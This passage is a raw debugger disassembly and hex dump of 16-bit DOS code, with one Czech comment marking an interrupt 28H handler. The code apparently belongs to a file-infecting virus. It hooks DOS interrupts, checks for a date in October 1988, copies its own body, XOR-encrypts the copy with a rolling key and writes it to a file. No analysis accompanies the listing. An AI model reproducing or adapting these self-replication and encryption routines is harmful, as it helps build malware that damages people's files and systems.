3478:06F2 A35E01         MOV    [015E],AX
3478:06F5 A36001         MOV    [0160],AX
3478:06F8 E897FE         CALL   0592
3478:06FB B80300         MOV    AX,0003
3478:06FE E86EFD         CALL   046F
3478:0701 40             INC    AX
3478:0702 F7266401       MUL    Word Ptr [0164]
3478:0706 7303           JNB    070B
3478:0708 B8FFFF         MOV    AX,FFFF
3478:070B A36401         MOV    [0164],AX
3478:070E 5D             POP    BP
3478:070F 5F             POP    DI
3478:0710 5E             POP    SI
3478:0711 5A             POP    DX
3478:0712 59             POP    CX
3478:0713 5B             POP    BX
3478:0714 58             POP    AX
3478:0715 07             POP    ES
3478:0716 1F             POP    DS
3478:0717 2E80265701FE   AND    Byte Ptr CS:[0157],FE
3478:071D 2EFF2E3301     JMP    FAR CS:[0133]

;==========================================================
; Obsluha preruseni 28H.
;
3478:0722 2EF606570108   TEST   Byte Ptr CS:[0157],08
3478:0728 741D           JZ     0747
3478:072A 50             PUSH   AX
3478:072B 51             PUSH   CX
3478:072C 52             PUSH   DX
3478:072D B42A           MOV    AH,2A
3478:072F CD21           INT    21
3478:0731 81F9C407       CMP    CX,07C4
3478:0735 720D           JB     0744
3478:0737 7705           JA     073E
3478:0739 80FE0A         CMP    DH,0A
3478:073C 7206           JB     0744
3478:073E 2E80265701F7   AND    Byte Ptr CS:[0157],F7
3478:0744 5A             POP    DX
3478:0745 59             POP    CX
3478:0746 58             POP    AX
3478:0747 2EFF2E3B01     JMP    FAR CS:[013B]
3478:074C 06             PUSH   ES
3478:074D 53             PUSH   BX
3478:074E B448           MOV    AH,48
3478:0750 BB6B00         MOV    BX,006B
3478:0753 CD21           INT    21
3478:0755 5B             POP    BX
3478:0756 7303           JNB    075B
3478:0758 F9             STC
3478:0759 07             POP    ES
3478:075A C3             RET
3478:075B 2EC606000101   MOV    Byte Ptr CS:[0100],01
3478:0761 8EC0           MOV    ES,AX
3478:0763 0E             PUSH   CS
3478:0764 1F             POP    DS
3478:0765 33FF           XOR    DI,DI
3478:0767 BE0001         MOV    SI,0100
3478:076A B9A506         MOV    CX,06A5
3478:076D FC             CLD
3478:076E F3             REPZ
3478:076F A4             MOVSB
3478:0770 BF2300         MOV    DI,0023
3478:0773 BE2301         MOV    SI,0123
3478:0776 03364B01       ADD    SI,[014B]
3478:077A B98206         MOV    CX,0682
3478:077D 263135         XOR    ES:[DI],SI
3478:0780 26310D         XOR    ES:[DI],CX
3478:0783 47             INC    DI
3478:0784 46             INC    SI
3478:0785 E2F6           LOOP   077D
3478:0787 8ED8           MOV    DS,AX
3478:0789 B440           MOV    AH,40
3478:078B 33D2           XOR    DX,DX
3478:078D B9A506         MOV    CX,06A5
3478:0790 CD21           INT    21
3478:0792 9C             PUSHF
3478:0793 50             PUSH   AX
3478:0794 B449           MOV    AH,49
3478:0796 CD21           INT    21
3478:0798 58             POP    AX
3478:0799 9D             POPF
3478:079A 0E             PUSH   CS
3478:079B 1F             POP    DS
3478:079C 72BA           JB     0758
3478:079E 3BC1           CMP    AX,CX
3478:07A0 75B6           JNZ    0758
3478:07A2 07             POP    ES
3478:07A3 F8             CLC
3478:07A4 C3             RET

34F4:07A0  01 0F 08 06 27 01 80 26-29 01 0F 08 06 29 01 A1  ....'..&)....).!
34F4:07B0  32 01 A3 2C 01 A0 27 01-A2 7A 01 E8 1A 05 E8 7A  2.#,. '."z.h..hz
34F4:07C0  05 E9 09 FE A0 25 01 FE-C0 24 0F 80 26 25 01 70  .i.~ %.~@$..&%.p
34F4:07D0  08 06 25 01 EB D9 A0 25-01 04 10 24 70 80 26 25  ..%.kY %...$p.&%
34F4:07E0  01 0F 08 06 25 01 EB C7-56 8B 36 30 01 3B 36 2C  ....%.kGV.60.;6,
34F4:07F0  01 75 0A 1E 2E 8E 1E 80-01 80 3C 1A 1F 5E C3 E8  .u........<..^Ch
34F4:0800  E6 FF 75 03 E9 DC FD BF-32 01 BE 34 01 06 1E 07  f.u.i\}?2.>4....
34F4:0810  B9 30 00 F3 A4 07 E8 7A-04 C6 06 78 01 18 C6 06  90.s$.hz.F.x..F.
34F4:0820  79 01 01 A1 2C 01 A3 2E-01 E9 F1 FC 83 3E 32 01  y..!,.#..iq|.>2.
34F4:0830  00 75 0D 80 3E 3A 03 00-74 03 E9 7B FD E9 AC FD  .u..>:..t.i{}i,}
34F4:0840  E8 03 00 E9 72 FD B9 17-00 E8 73 00 E8 D7 00 E2  h..ir}9..hs.hW.b
34F4:0850  F8 C6 06 79 01 01 C3 75-70 75 70 75 70 75 70 83  xF.y..Cupupupup.
34F4:0860  3E 32 01 00 74 0A 8B 3E-2E 01 3B 3E 32 01 73 21  >2..t..>..;>2.s!
34F4:0870  80 3E 7B 01 01 77 03 E9-72 FD 80 2E 7B 01 02 E8  .>{..w.ir}..{..h
34F4:0880  BE 00 A1 30 01 A3 32 01-A3 2C 01 E8 31 00 E8 95  >.!0.#2.#,.h1.h.
34F4:0890  00 E8 08 04 A1 2C 01 A3-2E 01 A1 32 01 A3 2C 01  .h..!,.#..!2.#,.
